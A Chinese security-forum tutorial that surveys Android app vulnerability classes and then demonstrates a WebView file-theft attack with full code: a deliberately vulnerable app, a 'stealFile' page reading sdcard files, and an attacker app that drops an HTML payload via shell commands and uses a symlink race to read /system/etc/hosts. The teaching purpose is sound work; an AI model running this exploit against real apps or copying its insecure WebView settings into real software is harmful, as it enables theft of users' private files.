[i春秋作家：MAX丶](https://bbs.ichunqiu.com/thread-37204-1-1.html?from=beef)  

基本知识Android架构  

  * Kernel内核层   
漏洞危害极大，通用性强  
驱动由于多而杂，也可能存在不少漏洞

  * Libaries系统运行库层  

    * 系统中间件形式提供的运行库   
包括[libc、WebKit、SQLite](https://bbs.ichunqiu.com/thread-37204-1-1.html?from=beef)等等

    * AndroidRunTime   
[Dalvik虚拟机](https://bbs.ichunqiu.com/thread-37204-1-1.html?from=beef)和内核库  

  * FrameWork应用框架层   
提供一系列的服务和API的接口

    * 活动管理器
    * 内容提供器
    * 视图
    * 资源管理器
    * 通知管理器  

  * Application应用层

    * 系统应用   
主屏幕Home、联系人Contact、电话Phone、浏览器Browser

    * 其他应用   
开发者使用应用程序框架层的API实现的程序

Andoroid常用组件

  * Acitivity活动
  * Service服务
  * BroadcastRecviver广播接收器
  * ContentProvider内容提供器  

Android App常见漏洞 （OWASP Mobile Top 10）平台使用不当

  * 概述   
平台功能的滥用，或未能使用平台的安全控制。如Intent误用、权限误用等

  * 风险   
很广泛，可能涉及移动平台各个服务

  * 举例   
iOS系统中，将密码数据存放在本地文件而没有存放在密钥链中，导致可以从伪加密的备份数据中读取  
Android系统中，Intent使用不当导致恶意用户劫持修改intent的内容，以原进程的身份权限执行任意动作

  * 不安全的数据存储

  * 不安全的通信  

典型漏洞及挖掘方法数据存储漏洞

  * 数据文件或目录

    * SharedPreferences   
data/data/程序包名/shared_prefs/*.xml  

      * 创建配置文件时没有使用MODE_PRIVATE模式，导致其他程序可以读取配置文件
      * 明文存储，而root用户可读，导致敏感数据泄露  

    * SQLiteDatabases   
data/data程序包名/database/*.db

  

      * 创建数据库时没有使用MODE_PRIVATE模式  

    * InternalStorage   
data/data/程序报名/files/*

  

      * MODE_PRIVATE
      * 明文存储  

    * ExternalStorage   
/mnt/sdcard/*  

      * 明文存储  

  

  * 检测方法  

    * 浏览/data/data/包名目录下的各个文件和目录，检查是否存在others用户可读的文件
    * 检查配置文件、数据库等是否存在明文敏感信息  

  * 挖掘方法  

    * 代码检测   
检查openFileOutput、getSharedPrefreences、openOrCreateDatabase等函数的mode参数是否为MODE_PRIVATE(0x0000）  

  

数据通信漏洞

  * 使用HTTP等明文协议将敏感信息传送至服务端  

    * 通过局域网嗅探、恶意公共WIFI、恶意代理服务、DNS劫持等手段捕获明文通信，产生中间人攻击  

  * SSL证书弱校验

  

    * APP中缺乏对SSL证书的校验   
客户端中应该实现X509TruestManager类，包括checkServerTrusted\checkClientTrusted\getInstance三个方法

    * 证书校验失败会导致异常，然后由应用程序对证书校验异常进行处理
    * 未对服务器证书校验会导致TLS中间人攻击   
使用HttpsURLConnection时，实现自定义HostnameVerifier过程中未对主机名做验证，则默认不检查证书域名与站点名是否匹配。或者在设置HttpsURLConnection的HostnameVerifier时，将其设为ALLOW_ALL_HOSTNAME_VERIIER则接受所有域名.

    * 攻击方法  

      * 开启Fiddler的HTTPS解析功能，生成并导出自签名证书，安装到手机中
      * 开启Fiddler代理，并允许远程主机连接该代理  

    * 挖掘方法  

      * 搜索.method public checkServerTrusted
      * 定位.method和end method
      * 检查是否存在return-void
      * 同理检查verify(String, SSLSession)的返回值是否恒为True、X509HostnameVerifier的参数是否为ALLOW_ALLHOSTNAME_VERIFIER  

  

  * SSL证书强校验   
可能通过Xp、Patch等方法绕过

  

组件暴露漏洞

  * Android:exported是四大组件中都有的一个属性，用来表示是否支持其他应用调用当前组件
  * 如果有intent-filter，默认值为true；反之默认则为false
  * exported导出组件的权限控制
  * 绕过认证  

    * activity暴露后被第三方调用，可能在没有密码的情况下登录/重置密码  

  * 敏感信息泄露  

    * recviver暴露后被第三方启动，可能查看到调试等信息中包含的敏感信息  

  * 越权行为

  

    * 低权限程序通过调用高权限程序暴露的组件，执行高权限动作  

  * 挖掘方法

  

    * 查看AndroidManifest.xml
    * 通过drozer的attacksurface工具进行安全评估  

  

弱加密漏洞

  * 密码硬编码   
反编译、root查看等可以取得

  * AES/DES弱加密   
ECB模式容易受到分析或重放攻击  

WebView

主要包括三种漏洞：

  * 任意代码执行  

    * Android4.2以后，通过addJavascriptInterface注解的方法可被网页中的java方法调用。如果未加过滤则可能存在漏洞
    * 挖掘方法：  

      * 编写遍历对象的网页，如果存在getClass方法则存在远程代码执行漏洞
      * fiddler的before脚本可以让任意webview访问任意网页时进行测试  

  

  * 域控制不严格  

    * WebView如果打开了对JavaScript的支持，同时未对file:///形式的URL做限制，则会导致coookie、私有文件、数据库等敏感信息泄露  

      * setAllowFileAccess
      * setAllowFileAccessFromFileURLs
      * setAllowUniversalAccessFromFileURLs（导致远程泄露敏感信息）
      * 通过符号链接攻击可以访问本地文件：无论怎么限制，js都能访问本文件的。而通过延时执行和将当前文件替换成指向指向其他文件的软连接就可以读取到被符号链接所指向的文件  

  

  * 密码明文存储   
当用户选择保存在WebViEW中输入的用户名和密码时，则会被明文保存到app目录下的data.db中  
具有root权限的攻击者可以读取  

漏洞挖掘流程总结

  * 静态分析   
快速检测，获得分析重点目标  

    * 检查AndroidManifest文件
    * 脚本分析Smali代码  

  * 动态分析   
对疑似风险进行验证和危害评估  

    * 调试模式分析
    * 尝试操作/漏洞验证
    * drozer
    * 抓包分析数据及接口  

  * 逆向分析   
加密破解以及对逻辑和代码的进一步分析  

    *   
  
  
  
-  * 自动化辅助系统  

    * MobSF 包括前端web界面，
    * Marvin 包括前端web界面，部署麻烦
    * Inspeckage Xposed插件  

  

今天我们就来讲讲WebView 的漏洞

[Java] 纯文本查看 复制代码

[?](https://bbs.ichunqiu.com/#)

示例代码地址：[https://github.com/jltxgcy/AppVulnerability/tree/master/WebViewFileDemo](https://bbs.ichunqiu.com/thread-37204-1-1.html?from=beef)。

或者是我的github：[https://github.com/MaxSecret/AppVulnerability/tree/master/WebViewFileDemo1](https://bbs.ichunqiu.com/thread-37204-1-1.html?from=beef)  

代码如下代码主要区别在于这次加载的attack_file.html

public class MainActivity extends Activity {

private WebView webView;

private Uri mUri;

private String url;

String mUrl1 = "file:///android_asset/html/attack_file.html";

//String mUrl2 = "file:///android_asset/html/test.html";

@Override

protected void onCreate(Bundle savedInstanceState) {

super.onCreate(savedInstanceState);

setContentView(R.layout.activity_main);

webView = (WebView) findViewById(R.id.webview);

webView.getSettings().setJavaScriptEnabled(true);

webView.addJavascriptInterface(new JSInterface(), "jsInterface");

webView.getSettings().setAllowFileAccessFromFileURLs(true);

webView.setWebChromeClient(new WebChromeClient() {

@Override

public boolean onJsAlert(WebView view, String url, String message,JsResult
result) {

//Required functionality here

return super.onJsAlert(view, url, message, result);

}

});

webView.loadUrl(mUrl1);

}

class JSInterface {

public String onButtonClick(String text) {

final String str = text;

runOnUiThread(new Runnable() {

@Override

public void run() {

Log.e("leehong2", "onButtonClick: text = " + str);

Toast.makeText(getApplicationContext(), "onButtonClick: text = " + str,
Toast.LENGTH_LONG).show();

}

});

return "This text is returned from Java layer. js text = " + text;

}

public void onImageClick(String url, int width, int height) {

final String str = "onImageClick: text = " + url + " width = " + width + "
height = " + height;

Log.i("leehong2", str);

runOnUiThread(new Runnable() {

@Override

public void run() {

Toast.makeText(getApplicationContext(), str, Toast.LENGTH_LONG).show();

}

});

}

}

}

这里webView.getSettings().setAllowFileAccessFromFileURLs(true)，标示可以通过javaScript访问file文件。

我们再来看attack_file.html的代码：‘

<font style="color:rgb(79, 79, 79)"><font face="&ampquot"><font style="font-size:16px"><html>

<body>

<script>

function stealFile()

{

var file = "file:///mnt/sdcard/233.txt";

var xmlHttpReq = new XMLHttpRequest();

xmlHttpReq.onreadystatechange = function(){

if(xmlHttpReq.readyState == 4){

alert(xmlHttpReq.responseText);

}

}

xmlHttpReq.open("GET", file);

xmlHttpReq.send(null);

}

stealFile();

</script>

</body>

</html> </font></font></font>

  

由于setAllowFileAccessFromFileURLs为true，所以webView.load这个html可以返回/mnt/sdcard/2333.txt的值。

如果setAllowFileAccessFromFileURLs为false，webView.load这个html不可以返回/mnt/sdcard/2333.txt的值。

即使setAllowFileAccessFromFileURLs为false，我们通过一种方式也可以跨过这个限制，这个我下一次讲讲.

首先运行WebViewFileDemo1，然后再运行AttackWebView来袭击WebView。

  

我们首先看WebViewFileDemo1，主要代码如下：

<font face="&ampquot"><font style="font-size:16px">package
com.example.webviewfiledemo; [/size][/font][/p]

import android.app.Activity;

import android.content.Intent;

import android.net.Uri;

import android.os.Bundle;

import android.util.Log;

import android.webkit.JsResult;

import android.webkit.WebChromeClient;

import android.webkit.WebView;

import android.widget.Toast;

public class MainActivity extends Activity {

private WebView webView;

private Uri mUri;

private String url;

@Override

protected void onCreate(Bundle savedInstanceState) {

super.onCreate(savedInstanceState);

setContentView(R.layout.activity_main);

webView = (WebView) findViewById(R.id.webview);

webView.getSettings().setJavaScriptEnabled(true);

webView.addJavascriptInterface(new JSInterface(), "jsInterface");

webView.getSettings().setAllowFileAccessFromFileURLs(false);

//webView.getSettings().setAllowFileAccess(false);

webView.setWebChromeClient(new WebChromeClient() {

@Override

public boolean onJsAlert(WebView view, String url, String message,JsResult
result) {

//Required functionality here

return super.onJsAlert(view, url, message, result);

}

});

Intent i = getIntent();

if (i != null) {

mUri = i.getData();

}

if (mUri != null) {

url = mUri.toString();

}

if (url != null) {

webView.loadUrl(url);

}

}

} </font></font>

  

这个Activity接收来自外部的Intent，提取Intent里面的url并加载。

  

接着我们来看AttackWebView工程，这里就是向com.example.webviewfiledemo.MainActivity发送Intent的工程。代码如下：

public class MainActivity extends Activity {

public final static String HTML =

"<body>" +

"<u>Wait a few seconds.</u>" +

"<script>" +

"var d = document;"+

"function doitjs(){"+

"var xhr = new XMLHttpRequest;"+

"xhr.onload = function(){"+

"var txt = xhr.responseText;"+

"d.body.appendChild(d.createTextNode(txt));"+

"alert(txt);"+"};"+

"xhr.open('GET',d.URL);"+

"xhr.send(null);"+

"}"+

"setTimeout(doitjs,8000);"+

"</script>"+

"</body>";

public static String MY_TMP_DIR;

@Override

protected void onCreate(Bundle savedInstanceState) {

super.onCreate(savedInstanceState);

setContentView(R.layout.activity_main);

MY_TMP_DIR = getDir("payload_odex", MODE_PRIVATE).getAbsolutePath();

doit();

}

public void doit() {

String HTML_PATH = MY_TMP_DIR + "/A0" + ".html";

try {

cmdexec("mkdir " + MY_TMP_DIR);

cmdexec("echo \"" + HTML + "\" > " + HTML_PATH);

cmdexec("chmod -R 777 " + MY_TMP_DIR);

Thread.sleep(1000);

invokeVulnAPP("file://" + HTML_PATH);

Thread.sleep(6000);

cmdexec("rm " + HTML_PATH);

cmdexec("ln -s " + "/system/etc/hosts" + " " + HTML_PATH);

} catch (Exception e) {

// TODO: handle exception

}

}

public void invokeVulnAPP(String url) {

try {

Intent intent = new Intent(Intent.ACTION_MAIN,Uri.parse(url));

intent.addCategory(Intent.CATEGORY_LAUNCHER);

intent.setClassName("com.example.webviewfiledemo",
"com.example.webviewfiledemo.MainActivity");

startActivity(intent);

} catch (Exception e) {

// TODO: handle exception

}

}

public void cmdexec(String cmd) {

try {

String[] tmp = new String[] { "/system/bin/sh", "-c", cmd };

Runtime.getRuntime().exec(tmp);

} catch (Exception e) {

// TODO: handle exception

}

}

}

通过invokeVulnAPP，打开了com.example.webviewfiledemo.MainActivity并传递了Intent。这个Activity提取了Url，Url为/sdcard/payload_odex/A0.html，webView加载了这个html，html内容如下：  

public final static String HTML =

"<body>" +

"<u>Wait a few seconds.</u>" +

"<script>" +

"var d = document;"+

"function doitjs(){"+

"var xhr = new XMLHttpRequest;"+

"xhr.onload = function(){"+

"var txt = xhr.responseText;"+

"d.body.appendChild(d.createTextNode(txt));"+

"alert(txt);"+"};"+

"xhr.open('GET',d.URL);"+

"xhr.send(null);"+

"}"+

"setTimeout(doitjs,8000);"+

"</script>"+

"</body>";

当WebViewFileDemo1工程中webView加载A0.html后，这个html的作用是延迟8秒读取A0.html本身。我们再回到AttackWebView工程，往下看代码。  

cmdexec("mkdir " + MY_TMP_DIR);

cmdexec("echo \"" + HTML + "\" > " + HTML_PATH); cmdexec("chmod -R 777 " +
MY_TMP_DIR);

Thread.sleep(1000);

invokeVulnAPP("file://" + HTML_PATH);

Thread.sleep(6000);

cmdexec("rm " + HTML_PATH);

cmdexec("ln -s " + "/system/etc/hosts" + " " + HTML_PATH);

调用完invokeVulnAPP后，6秒后，我们首先把A0.html删除，然后再重新软连接到/system/etc/hosts。注意此时当WebViewFileDemo1工程中webView加载A0.html，这个html的作用是延迟8秒读取A0.html本身，所以8秒后读取的是软连接/system/etc/hosts
。

